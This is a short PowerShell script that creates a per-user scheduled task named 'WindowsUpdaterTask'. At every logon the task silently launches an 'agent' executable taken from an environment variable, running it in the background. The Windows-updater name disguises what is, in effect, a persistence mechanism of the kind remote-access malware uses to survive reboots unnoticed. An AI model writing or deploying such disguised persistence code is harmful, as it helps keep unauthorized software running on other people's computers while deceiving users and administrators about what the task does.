param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

$taskName = "WindowsUpdaterTask"
$taskCommand = "cmd.exe"
$taskArguments = "/c start /b `"`" `"$agentPath`""

# Create scheduled task that runs at user logon
try {
    schtasks /create /tn $taskName /tr "$taskCommand $taskArguments" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
    Write-Output "✅ Scheduled task '$taskName' created. Agent will run at next logon."
} catch {
    Write-Output "❌ Failed to create task: $_"
}